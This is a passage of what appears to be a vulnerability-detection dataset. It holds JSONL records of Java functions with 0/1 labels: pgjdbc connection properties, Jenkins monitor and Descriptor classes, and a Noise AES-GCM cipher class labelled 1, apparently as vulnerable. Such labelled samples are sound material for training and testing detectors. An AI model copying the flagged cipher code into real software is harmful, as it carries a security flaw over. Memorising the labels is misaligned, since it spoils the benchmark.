bind String parameters as (usually 'varchar', 'unspecified' allows implicit casting to other types)\",\n    false,\n    new String[] {\"unspecified\", \"varchar\"}),\n\n  TARGET_SERVER_TYPE(\n    \"targetServerType\",\n    \"any\",\n    \"Specifies what kind of server to connect\",\n    false,\n    new String [] {\"any\", \"primary\", \"master\", \"slave\", \"secondary\",  \"preferSlave\", \"preferSecondary\"}),\n\n  /**\n   * Enable or disable TCP keep-alive. The default is {@code false}.\n   */\n  TCP_KEEP_ALIVE(\n    \"tcpKeepAlive\",\n    \"false\",\n    \"Enable or disable TCP keep-alive. The default is {@code false}.\"),\n\n  /**\n   * Specifies the length to return for types of unknown length.\n   */\n  UNKNOWN_LENGTH(\n    \"unknownLength\",\n    Integer.toString(Integer.MAX_VALUE),\n    \"Specifies the length to return for types of unknown length\"),\n\n  /**\n   * Username to connect to the database as.\n   */\n  USER(\n    \"user\",\n    null,\n    \"Username to connect to the database as.\",\n    true),\n\n  /**\n   * Use SPNEGO in SSPI authentication requests.\n   */\n  USE_SPNEGO(\n    \"useSpnego\",\n    \"false\",\n    \"Use SPNEGO in SSPI authentication requests\"),\n\n  /**\n   * Factory class to instantiate factories for XML processing.\n   * The default factory disables external entity processing.\n   * Legacy behavior with external entity processing can be enabled by specifying a value of LEGACY_INSECURE.\n   * Or specify a custom class that implements {@code org.postgresql.xml.PGXmlFactoryFactory}.\n   */\n  XML_FACTORY_FACTORY(\n    \"xmlFactoryFactory\",\n    \"\",\n    \"Factory class to instantiate factories for XML processing\"),\n\n  ;\n\n  private final String name;\n  private final String defaultValue;\n  private final boolean required;\n  private final String description;\n  private final String[] choices;\n  private final boolean deprecated;\n\n  PGProperty(String name, String defaultValue, String description) {\n    this(name, defaultValue, description, false);\n  }\n\n  PGProperty(String name, String defaultValue, String description, boolean required) {\n    this(name, defaultValue, description, required, (String[]) null);\n  }\n\n  PGProperty(String name, String defaultValue, String description, boolean required, String[] choices) {\n    this.name = name;\n    this.defaultValue = defaultValue;\n    this.required = required;\n    this.description = description;\n    this.choices = choices;\n    try {\n      this.deprecated = PGProperty.class.getField(name()).getAnnotation(Deprecated.class) != null;\n    } catch (NoSuchFieldException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  private static final Map<String, PGProperty> PROPS_BY_NAME = new HashMap<String, PGProperty>();\n  static {\n    for (PGProperty prop : PGProperty.values()) {\n      if (PROPS_BY_NAME.put(prop.getName(), prop) != null) {\n        throw new IllegalStateException(\"Duplicate PGProperty name: \" + prop.getName());\n      }\n    }\n  }\n\n  /**\n   * Returns the name of the connection parameter. The name is the key that must be used in JDBC URL\n   * or in Driver properties\n   *\n   * @return the name of the connection parameter\n   */\n  public String getName() {\n    return name;\n  }\n\n  /**\n   * Returns the default value for this connection parameter.\n   *\n   * @return the default value for this connection parameter or null\n   */\n  public String getDefaultValue() {\n    return defaultValue;\n  }\n\n  /**\n   * Returns whether this parameter is required.\n   *\n   * @return whether this parameter is required\n   */\n  public boolean isRequired() {\n    return required;\n  }\n\n  /**\n   * Returns the description for this connection parameter.\n   *\n   * @return the description for this connection parameter\n   */\n  public String getDescription() {\n    return description;\n  }\n\n  /**\n   * Returns the available values for this connection parameter.\n   *\n   * @return the available values for this connection parameter or null\n   */\n  public String[] getChoices() {\n    return choices;\n  }\n\n  /**\n   * Returns whether this connection parameter is deprecated.\n   *\n   * @return whether this connection parameter is deprecated\n   */\n  public boolean isDeprecated() {\n    return deprecated;\n  }\n\n  /**\n   * Returns the value of the connection parameters according to the given {@code Properties} or the\n   * default value.\n   *\n   * @param properties properties to take actual value from\n   * @return evaluated value for this connection parameter\n   */\n  public String get(Properties properties) {\n    return properties.getProperty(name, defaultValue);\n  }\n\n  /**\n   * Set the value for this connection parameter in the given {@code Properties}.\n   *\n   * @param properties properties in which the value should be set\n   * @param value value for this connection parameter\n   */\n  public void set(Properties properties, String value) {\n    if (value == null) {\n      properties.remove(name);\n    } else {\n      properties.setProperty(name, value);\n    }\n  }\n\n  /**\n   * Return the boolean value for this connection parameter in the given {@code Properties}.\n   *\n   * @param properties properties to take actual value from\n   * @return evaluated value for this connection parameter converted to boolean\n   */\n  public boolean getBoolean(Properties properties) {\n    return Boolean.valueOf(get(properties));\n  }\n\n  /**\n   * Return the int value for this connection parameter in the given {@code Properties}. Prefer the\n   * use of {@link #getInt(Properties)} anywhere you can throw an {@link java.sql.SQLException}.\n   *\n   * @param properties properties to take actual value from\n   * @return evaluated value for this connection parameter converted to int\n   * @throws NumberFormatException if it cannot be converted to int.\n   */\n  public int getIntNoCheck(Properties properties) {\n    String value = get(properties);\n    return Integer.parseInt(value);\n  }\n\n  /**\n   * Return the int value for this connection parameter in the given {@code Properties}.\n   *\n   * @param properties properties to take actual value from\n   * @return evaluated value for this connection parameter converted to int\n   * @throws PSQLException if it cannot be converted to int.\n   */\n  public int getInt(Properties properties) throws PSQLException {\n    String value = get(properties);\n    try {\n      return Integer.parseInt(value);\n    } catch (NumberFormatException nfe) {\n      throw new PSQLException(GT.tr(\"{0} parameter value must be an integer but was: {1}\",\n          getName(), value), PSQLState.INVALID_PARAMETER_VALUE, nfe);\n    }\n  }\n\n  /**\n   * Return the {@code Integer} value for this connection parameter in the given {@code Properties}.\n   *\n   * @param properties properties to take actual value from\n   * @return evaluated value for this connection parameter converted to Integer or null\n   * @throws PSQLException if unable to parse property as integer\n   */\n  public Integer getInteger(Properties properties) throws PSQLException {\n    String value = get(properties);\n    if (value == null) {\n      return null;\n    }\n    try {\n      return Integer.parseInt(value);\n    } catch (NumberFormatException nfe) {\n      throw new PSQLException(GT.tr(\"{0} parameter value must be an integer but was: {1}\",\n          getName(), value), PSQLState.INVALID_PARAMETER_VALUE, nfe);\n    }\n  }\n\n  /**\n   * Set the boolean value for this connection parameter in the given {@code Properties}.\n   *\n   * @param properties properties in which the value should be set\n   * @param value boolean value for this connection parameter\n   */\n  public void set(Properties properties, boolean value) {\n    properties.setProperty(name, Boolean.toString(value));\n  }\n\n  /**\n   * Set the int value for this connection parameter in the given {@code Properties}.\n   *\n   * @param properties properties in which the value should be set\n   * @param value int value for this connection parameter\n   */\n  public void set(Properties properties, int value) {\n    properties.setProperty(name, Integer.toString(value));\n  }\n\n  /**\n   * Test whether this property is present in the given {@code Properties}.\n   *\n   * @param properties set of properties to check current in\n   * @return true if the parameter is specified in the given properties\n   */\n  public boolean isPresent(Properties properties) {\n    return getSetString(properties) != null;\n  }\n\n  /**\n   * Convert this connection parameter and the value read from the given {@code Properties} into a\n   * {@code DriverPropertyInfo}.\n   *\n   * @param properties properties to take actual value from\n   * @return a DriverPropertyInfo representing this connection parameter\n   */\n  public DriverPropertyInfo toDriverPropertyInfo(Properties properties) {\n    DriverPropertyInfo propertyInfo = new DriverPropertyInfo(name, get(properties));\n    propertyInfo.required = required;\n    propertyInfo.description = description;\n    propertyInfo.choices = choices;\n    return propertyInfo;\n  }\n\n  public static PGProperty forName(String name) {\n    return PROPS_BY_NAME.get(name);\n  }\n\n  /**\n   * Return the property if exists but avoiding the default. Allowing the caller to detect the lack\n   * of a property.\n   *\n   * @param properties properties bundle\n   * @return the value of a set property\n   */\n  public String getSetString(Properties properties) {\n    Object o = properties.get(name);\n    if (o instanceof String) {\n      return (String) o;\n    }\n    return null;\n  }\n}\n", "target": 0}
{"idx": 1033, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2004-2009, Sun Microsystems, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.diagnosis;\n\nimport hudson.model.AdministrativeMonitor;\nimport hudson.model.AbstractModelObject;\nimport hudson.Extension;\nimport hudson.ExtensionPoint;\nimport hudson.ExtensionList;\nimport org.kohsuke.stapler.HttpResponse;\nimport org.kohsuke.stapler.HttpResponses;\nimport org.kohsuke.stapler.QueryParameter;\nimport org.kohsuke.stapler.interceptor.RequirePOST;\n\nimport java.io.IOException;\nimport java.util.List;\n\n/**\n * Monitors the disk usage of <tt>JENKINS_HOME</tt>, and if it's almost filled up, warn the user.\n *\n * @author Kohsuke Kawaguchi\n */\n@Extension\npublic final class HudsonHomeDiskUsageMonitor extends AdministrativeMonitor {\n    /**\n     * Value updated by {@link HudsonHomeDiskUsageChecker}.\n     */\n    /*package*/ boolean activated;\n\n    public HudsonHomeDiskUsageMonitor() {\n        super(\"hudsonHomeIsFull\");\n    }\n\n    public boolean isActivated() {\n        return activated;\n    }\n    \n    @Override\n    public String getDisplayName() {\n    \treturn Messages.HudsonHomeDiskUsageMonitor_DisplayName();\n    }\n\n    /**\n     * Depending on whether the user said \"yes\" or \"no\", send him to the right place.\n     */\n    @RequirePOST\n    public HttpResponse doAct(@QueryParameter String no) throws IOException {\n        if(no!=null) {\n            disable(true);\n            return HttpResponses.redirectViaContextPath(\"/manage\");\n        } else {\n            return HttpResponses.redirectToDot();\n        }\n    }\n\n    public List<Solution> getSolutions() {\n        return Solution.all();\n    }\n\n    /**\n     * Binds a solution to the URL.\n     */\n    public Solution getSolution(String id) {\n        for( Solution s : Solution.all() )\n            if(s.id.equals(id))\n                return s;\n        return null;\n    }\n\n    /**\n     * Short cut for getting the singleton instance.\n     */\n    public static HudsonHomeDiskUsageMonitor get() {\n        return all().get(HudsonHomeDiskUsageMonitor.class);\n    }\n\n    /**\n     * Extension point for suggesting solutions for full JENKINS_HOME.\n     *\n     * <h3>Views</h3>\n     * <dl>\n     * <dt>message.jelly</dt>\n     * <dd>\n     * This view is rendered inside an LI tag as a possible solution to the full JENKINS_HOME problem.\n     * </dd>\n     * </dl>\n     */\n    public static abstract class Solution extends AbstractModelObject implements ExtensionPoint {\n        /**\n         * Human-readable ID of this monitor, which needs to be unique within the system.\n         *\n         * <p>\n         * This ID is used to remember persisted setting for this monitor,\n         * so the ID should remain consistent beyond the Hudson JVM lifespan.\n         */\n        public final String id;\n\n        protected Solution(String id) {\n            this.id = id;\n        }\n\n        protected Solution() {\n            this.id = this.getClass().getName();\n        }\n\n        /**\n         * Returns the URL of this monitor, relative to the context path.\n         */\n        public String getUrl() {\n            return HudsonHomeDiskUsageMonitor.get().getUrl()+\"/solution/\"+id;\n        }\n\n        /**\n         * All registered {@link Solution}s.\n         */\n        public static ExtensionList<Solution> all() {\n            return ExtensionList.lookup(Solution.class);\n        }\n    }\n}\n", "target": 0}
{"idx": 1034, "func": "/*\n * Copyright (C) 2016 Southern Storm Software, Pty Ltd.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a\n * copy of this software and associated documentation files (the \"Software\"),\n * to deal in the Software without restriction, including without limitation\n * the rights to use, copy, modify, merge, publish, distribute, sublicense,\n * and/or sell copies of the Software, and to permit persons to whom the\n * Software is furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included\n * in all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS\n * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n * DEALINGS IN THE SOFTWARE.\n */\n\npackage com.southernstorm.noise.protocol;\n\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.InvalidKeyException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\nimport javax.crypto.BadPaddingException;\nimport javax.crypto.Cipher;\nimport javax.crypto.IllegalBlockSizeException;\nimport javax.crypto.NoSuchPaddingException;\nimport javax.crypto.ShortBufferException;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\n\nimport com.southernstorm.noise.crypto.GHASH;\n\n/**\n * Emulates the \"AESGCM\" cipher for Noise using the \"AES/CTR/NoPadding\"\n * transformation from JCA/JCE.\n * \n * This class is used on platforms that don't have \"AES/GCM/NoPadding\",\n * but which do have the older \"AES/CTR/NoPadding\".\n */\nclass AESGCMOnCtrCipherState implements CipherState {\n\n\tprivate Cipher cipher;\n\tprivate SecretKeySpec keySpec;\n\tprivate long n;\n\tprivate byte[] iv;\n\tprivate byte[] hashKey;\n\tprivate GHASH ghash;\n\n\t/**\n\t * Constructs a new cipher state for the \"AESGCM\" algorithm.\n\t * \n\t * @throws NoSuchAlgorithmException The system does not have a\n\t * provider for this algorithm.\n\t */\n\tpublic AESGCMOnCtrCipherState() throws NoSuchAlgorithmException\n\t{\n\t\ttry {\n\t\t\tcipher = Cipher.getInstance(\"AES/CTR/NoPadding\");\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\t// AES/CTR is available, but not the unpadded version?  Huh?\n\t\t\tthrow new NoSuchAlgorithmException(\"AES/CTR/NoPadding not available\", e);\n\t\t}\n\t\tkeySpec = null;\n\t\tn = 0;\n\t\tiv = new byte [16];\n\t\thashKey = new byte [16];\n\t\tghash = new GHASH();\n\t\t\n\t\t// Try to set a 256-bit key on the cipher.  Some JCE's are\n\t\t// configured to disallow 256-bit AES if an extra policy\n\t\t// file has not been installed.\n\t\ttry {\n\t\t\tSecretKeySpec spec = new SecretKeySpec(new byte [32], \"AES\");\n\t\t\tIvParameterSpec params = new IvParameterSpec(iv);\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, spec, params);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tthrow new NoSuchAlgorithmException(\"AES/CTR/NoPadding does not support 256-bit keys\", e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tthrow new NoSuchAlgorithmException(\"AES/CTR/NoPadding does not support 256-bit keys\", e);\n\t\t}\n\t}\n\n\t@Override\n\tpublic void destroy() {\n\t\t// There doesn't seem to be a standard API to clean out a Cipher.\n\t\t// So we instead set the key and IV to all-zeroes to hopefully\n\t\t// destroy the sensitive data in the cipher instance.\n\t\tghash.destroy();\n\t\tNoise.destroy(hashKey);\n\t\tNoise.destroy(iv);\n\t\tkeySpec = new SecretKeySpec(new byte [32], \"AES\");\n\t\tIvParameterSpec params = new IvParameterSpec(iv);\n\t\ttry {\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, keySpec, params);\n\t\t} catch (InvalidKeyException e) {\n\t\t\t// Shouldn't happen.\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\t// Shouldn't happen.\n\t\t}\n\t}\n\n\t@Override\n\tpublic String getCipherName() {\n\t\treturn \"AESGCM\";\n\t}\n\n\t@Override\n\tpublic int getKeyLength() {\n\t\treturn 32;\n\t}\n\n\t@Override\n\tpublic int getMACLength() {\n\t\treturn keySpec != null ? 16 : 0;\n\t}\n\n\t@Override\n\tpublic void initializeKey(byte[] key, int offset) {\n\t\t// Set the encryption key.\n\t\tkeySpec = new SecretKeySpec(key, offset, 32, \"AES\");\n\t\t\n\t\t// Generate the hashing key by encrypting a block of zeroes.\n\t\tArrays.fill(iv, (byte)0);\n\t\tArrays.fill(hashKey, (byte)0);\n\t\ttry {\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, keySpec, new IvParameterSpec(iv));\n\t\t} catch (InvalidKeyException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t}\n\t\ttry {\n\t\t\tint result = cipher.update(hashKey, 0, 16, hashKey, 0);\n\t\t\tcipher.doFinal(hashKey, result);\n\t\t} catch (ShortBufferException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (BadPaddingException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t}\n\t\tghash.reset(hashKey, 0);\n\t\t\n\t\t// Reset the nonce.\n\t\tn = 0;\n\t}\n\n\t@Override\n\tpublic boolean hasKey() {\n\t\treturn keySpec != null;\n\t}\n\n\t/**\n\t * Set up to encrypt or decrypt the next packet.\n\t * \n\t * @param ad The associated data for the packet.\n\t */\n\tprivate void setup(byte[] ad) throws InvalidKeyException, InvalidAlgorithmParameterException\n\t{\n\t\t// Check for nonce wrap-around.\n\t\tif (n == -1L)\n\t\t\tthrow new IllegalStateException(\"Nonce has wrapped around\");\n\t\t\n\t\t// Format the counter/IV block for AES/CTR/NoPadding.\n\t\tiv[0] = 0;\n\t\tiv[1] = 0;\n\t\tiv[2] = 0;\n\t\tiv[3] = 0;\n\t\tiv[4] = (byte)(n >> 56);\n\t\tiv[5] = (byte)(n >> 48);\n\t\tiv[6] = (byte)(n >> 40);\n\t\tiv[7] = (byte)(n >> 32);\n\t\tiv[8] = (byte)(n >> 24);\n\t\tiv[9] = (byte)(n >> 16);\n\t\tiv[10] = (byte)(n >> 8);\n\t\tiv[11] = (byte)n;\n\t\tiv[12] = 0;\n\t\tiv[13] = 0;\n\t\tiv[14] = 0;\n\t\tiv[15] = 1;\n\t\t++n;\n\t\t\n\t\t// Initialize the CTR mode cipher with the key and IV.\n\t\tcipher.init(Cipher.ENCRYPT_MODE, keySpec, new IvParameterSpec(iv));\n\t\t\n\t\t// Encrypt a block of zeroes to generate the hash key to XOR\n\t\t// the GHASH tag with at the end of the encrypt/decrypt operation.\n\t\tArrays.fill(hashKey, (byte)0);\n\t\ttry {\n\t\t\tcipher.update(hashKey, 0, 16, hashKey, 0);\n\t\t} catch (ShortBufferException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t}\n\t\t\n\t\t// Initialize the GHASH with the associated data value.\n\t\tghash.reset();\n\t\tif (ad != null) {\n\t\t\tghash.update(ad, 0, ad.length);\n\t\t\tghash.pad();\n\t\t}\n\t}\n\n\t@Override\n\tpublic int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,\n\t\t\tbyte[] ciphertext, int ciphertextOffset, int length)\n\t\t\tthrows ShortBufferException {\n\t\tint space;\n\t\tif (ciphertextOffset > ciphertext.length)\n\t\t\tspace = 0;\n\t\telse\n\t\t\tspace = ciphertext.length - ciphertextOffset;\n\t\tif (keySpec == null) {\n\t\t\t// The key is not set yet - return the plaintext as-is.\n\t\t\tif (length > space)\n\t\t\t\tthrow new ShortBufferException();\n\t\t\tif (plaintext != ciphertext || plaintextOffset != ciphertextOffset)\n\t\t\t\tSystem.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);\n\t\t\treturn length;\n\t\t}\n\t\tif (space < 16 || length > (space - 16))\n\t\t\tthrow new ShortBufferException();\n\t\ttry {\n\t\t\tsetup(ad);\n\t\t\tint result = cipher.update(plaintext, plaintextOffset, length, ciphertext, ciphertextOffset);\n\t\t\tcipher.doFinal(ciphertext, ciphertextOffset + result);\n\t\t} catch (InvalidKeyException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (BadPaddingException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t}\n\t\tghash.update(ciphertext, ciphertextOffset, length);\n\t\tghash.pad(ad != null ? ad.length : 0, length);\n\t\tghash.finish(ciphertext, ciphertextOffset + length, 16);\n\t\tfor (int index = 0; index < 16; ++index)\n\t\t\tciphertext[ciphertextOffset + length + index] ^= hashKey[index];\n\t\treturn length + 16;\n\t}\n\n\t@Override\n\tpublic int decryptWithAd(byte[] ad, byte[] ciphertext,\n\t\t\tint ciphertextOffset, byte[] plaintext, int plaintextOffset,\n\t\t\tint length) throws ShortBufferException, BadPaddingException {\n\t\tint space;\n\t\tif (ciphertextOffset > ciphertext.length)\n\t\t\tspace = 0;\n\t\telse\n\t\t\tspace = ciphertext.length - ciphertextOffset;\n\t\tif (length > space)\n\t\t\tthrow new ShortBufferException();\n\t\tif (plaintextOffset > plaintext.length)\n\t\t\tspace = 0;\n\t\telse\n\t\t\tspace = plaintext.length - plaintextOffset;\n\t\tif (keySpec == null) {\n\t\t\t// The key is not set yet - return the ciphertext as-is.\n\t\t\tif (length > space)\n\t\t\t\tthrow new ShortBufferException();\n\t\t\tif (plaintext != ciphertext || plaintextOffset != ciphertextOffset)\n\t\t\t\tSystem.arraycopy(ciphertext, ciphertextOffset, plaintext, plaintextOffset, length);\n\t\t\treturn length;\n\t\t}\n\t\tif (length < 16)\n\t\t\tNoise.throwBadTagException();\n\t\tint dataLen = length - 16;\n\t\tif (dataLen > space)\n\t\t\tthrow new ShortBufferException();\n\t\ttry {\n\t\t\tsetup(ad);\n\t\t} catch (InvalidKeyException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t}\n\t\tghash.update(ciphertext, ciphertextOffset, dataLen);\n\t\tghash.pad(ad != null ? ad.length : 0, dataLen);\n\t\tghash.finish(iv, 0, 16);\n\t\tint temp = 0;\n\t\tfor (int index = 0; index < 16; ++index)\n\t\t\ttemp |= (hashKey[index] ^ iv[index] ^ ciphertext[ciphertextOffset + dataLen + index]);\n\t\tif ((temp & 0xFF) != 0)\n\t\t\tNoise.throwBadTagException();\n\t\ttry {\n\t\t\tint result = cipher.update(ciphertext, ciphertextOffset, dataLen, plaintext, plaintextOffset);\n\t\t\tcipher.doFinal(plaintext, plaintextOffset + result);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t} catch (BadPaddingException e) {\n\t\t\t// Shouldn't happen.\n\t\t\tthrow new IllegalStateException(e);\n\t\t}\n\t\treturn dataLen;\n\t}\n\n\t@Override\n\tpublic CipherState fork(byte[] key, int offset) {\n\t\tCipherState cipher;\n\t\ttry {\n\t\t\tcipher = new AESGCMOnCtrCipherState();\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\t// Shouldn't happen.\n\t\t\treturn null;\n\t\t}\n\t\tcipher.initializeKey(key, offset);\n\t\treturn cipher;\n\t}\n\n\t@Override\n\tpublic void setNonce(long nonce) {\n\t\tn = nonce;\n\t}\n}\n", "target": 1}
{"idx": 1035, "func": "/*\n * The MIT License\n * \n * Copyright (c) 2004-2011, Sun Microsystems, Inc., Kohsuke Kawaguchi\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.model;\n\nimport hudson.DescriptorExtensionList;\nimport hudson.PluginWrapper;\nimport hudson.RelativePath;\nimport hudson.XmlFile;\nimport hudson.BulkChange;\nimport hudson.Util;\nimport hudson.model.listeners.SaveableListener;\nimport hudson.util.FormApply;\nimport hudson.util.ReflectionUtils;\nimport hudson.util.ReflectionUtils.Parameter;\nimport hudson.views.ListViewColumn;\nimport jenkins.model.Jenkins;\nimport net.sf.json.JSONArray;\nimport net.sf.json.JSONObject;\nimport org.kohsuke.stapler.*;\nimport org.kohsuke.stapler.jelly.JellyCompatibleFacet;\nimport org.kohsuke.stapler.lang.Klass;\nimport org.springframework.util.StringUtils;\nimport org.jvnet.tiger_types.Types;\nimport org.apache.commons.io.IOUtils;\n\nimport static hudson.Functions.*;\nimport static hudson.util.QuotedStringTokenizer.*;\nimport static javax.servlet.http.HttpServletResponse.SC_NOT_FOUND;\nimport javax.servlet.ServletException;\nimport javax.servlet.RequestDispatcher;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Locale;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\nimport java.lang.reflect.Type;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.ParameterizedType;\nimport java.beans.Introspector;\nimport javax.annotation.CheckForNull;\nimport javax.annotation.Nonnull;\n\n/**\n * Metadata about a configurable instance.\n *\n * <p>\n * {@link Descriptor} is an object that has metadata about a {@link Describable}\n * object, and also serves as a factory (in a way this relationship is similar\n * to {@link Object}/{@link Class} relationship.\n *\n * A {@link Descriptor}/{@link Describable}\n * combination is used throughout in Hudson to implement a\n * configuration/extensibility mechanism.\n *\n * <p>\n * Take the list view support as an example, which is implemented\n * in {@link ListView} class. Whenever a new view is created, a new\n * {@link ListView} instance is created with the configuration\n * information. This instance gets serialized to XML, and this instance\n * will be called to render the view page. This is the job\n * of {@link Describable} &mdash; each instance represents a specific\n * configuration of a view (what projects are in it, regular expression, etc.)\n *\n * <p>\n * For Hudson to create such configured {@link ListView} instance, Hudson\n * needs another object that captures the metadata of {@link ListView},\n * and that is what a {@link Descriptor} is for. {@link ListView} class\n * has a singleton descriptor, and this descriptor helps render\n * the configuration form, remember system-wide configuration, and works as a factory.\n *\n * <p>\n * {@link Descriptor} also usually have its associated views.\n *\n *\n * <h2>Persistence</h2>\n * <p>\n * {@link Descriptor} can persist data just by storing them in fields.\n * However, it is the responsibility of the derived type to properly\n * invoke {@link #save()} and {@link #load()}.\n *\n * <h2>Reflection Enhancement</h2>\n * {@link Descriptor} defines addition to the standard Java reflection\n * and provides reflective information about its corresponding {@link Describable}.\n * These are primarily used by tag libraries to\n * keep the Jelly scripts concise. \n *\n * @author Kohsuke Kawaguchi\n * @see Describable\n */\npublic abstract class Descriptor<T extends Describable<T>> implements Saveable {\n    /**\n     * The class being described by this descriptor.\n     */\n    public transient final Class<? extends T> clazz;\n\n    private transient final Map<String,String> checkMethods = new ConcurrentHashMap<String,String>();\n\n    /**\n     * Lazily computed list of properties on {@link #clazz} and on the descriptor itself.\n     */\n    private transient volatile Map<String, PropertyType> propertyTypes,globalPropertyTypes;\n\n    /**\n     * Represents a readable property on {@link Describable}.\n     */\n    public static final class PropertyType {\n        public final Class clazz;\n        public final Type type;\n        private volatile Class itemType;\n        public final String displayName;\n\n        PropertyType(Class clazz, Type type, String displayName) {\n            this.clazz = clazz;\n            this.type = type;\n            this.displayName = displayName;\n        }\n\n        PropertyType(Field f) {\n            this(f.getType(),f.getGenericType(),f.toString());\n        }\n\n        PropertyType(Method getter) {\n            this(getter.getReturnType(),getter.getGenericReturnType(),getter.toString());\n        }\n\n        public Enum[] getEnumConstants() {\n            return (Enum[])clazz.getEnumConstants();\n        }\n\n        /**\n         * If the property is a collection/array type, what is an item type?\n         */\n        public Class getItemType() {\n            if(itemType==null)\n                itemType = computeItemType();\n            return itemType;\n        }\n\n        private Class computeItemType() {\n            if(clazz.isArray()) {\n                return clazz.getComponentType();\n            }\n            if(Collection.class.isAssignableFrom(clazz)) {\n                Type col = Types.getBaseClass(type, Collection.class);\n\n                if (col instanceof ParameterizedType)\n                    return Types.erasure(Types.getTypeArgument(col,0));\n                else\n                    return Object.class;\n            }\n            return null;\n        }\n\n        /**\n         * Returns {@link Descriptor} whose 'clazz' is the same as {@link #getItemType() the item type}.\n         */\n        public Descriptor getItemTypeDescriptor() {\n            return Jenkins.getInstance().getDescriptor(getItemType());\n        }\n\n        public Descriptor 